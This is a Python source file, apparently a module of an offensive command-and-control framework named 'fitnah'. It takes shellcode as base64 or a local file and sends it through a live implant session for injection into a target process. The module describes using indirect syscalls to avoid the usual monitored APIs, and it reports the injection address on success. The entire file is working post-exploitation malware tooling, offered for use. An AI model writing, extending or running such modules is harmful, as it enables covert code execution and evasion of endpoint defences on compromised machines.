"""execution/shellcode_inject — KaynLdr PIC shellcode injection via indirect syscalls. MITRE T1055"""
import base64
from pathlib import Path
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class ShellcodeInject(BasePlugin):
    NAME        = "shellcode_inject"
    DESCRIPTION = (
        "Inject raw shellcode into a remote process using KaynLdr-style indirect syscalls "
        "(NtAllocateVirtualMemory → NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx). "
        "No VirtualAllocEx/CreateRemoteThread — all via our indirect syscall layer."
    )
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055"
    CATEGORY    = "execution"

    schema = ParamSchema().add(
        Param("pid",     int, required=False, default=0,
              help="Target PID (0 = self)"),
        Param("sc_b64",  str, required=False, default="",
              help="Base64-encoded raw shellcode bytes"),
        Param("sc_path", str, required=False, default="",
              help="Local path to raw shellcode .bin file (alternative to sc_b64)"),
    )

    @mitre("T1055")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        pid     = int(params.get("pid", 0))
        sc_b64  = params.get("sc_b64", "").strip()
        sc_path = params.get("sc_path", "").strip()

        if not sc_b64 and sc_path:
            p = Path(sc_path)
            if not p.exists():
                return ModuleResult.err(f"shellcode file not found: {sc_path}")
            sc_b64 = base64.b64encode(p.read_bytes()).decode()

        if not sc_b64:
            return ModuleResult.err("Provide sc_b64 (base64 shellcode) or sc_path (local .bin file)")

        r = ctx.send("shellcode_inject", {"pid": pid, "sc_b64": sc_b64})
        if r["status"] != "ok":
            return ModuleResult.err(f"shellcode_inject: {r['output']}")

        import json as _json
        try:
            payload = _json.loads(r["output"])
        except Exception:
            return ModuleResult.ok(data=r["output"])

        if payload.get("status") != "ok":
            return ModuleResult.err(payload.get("msg", "injection failed"))

        target = payload.get("pid", pid) or "self"
        addr   = payload.get("addr", "?")
        return ModuleResult.ok(
            data=f"[+] shellcode injected  pid={target}  addr={addr}"
        )
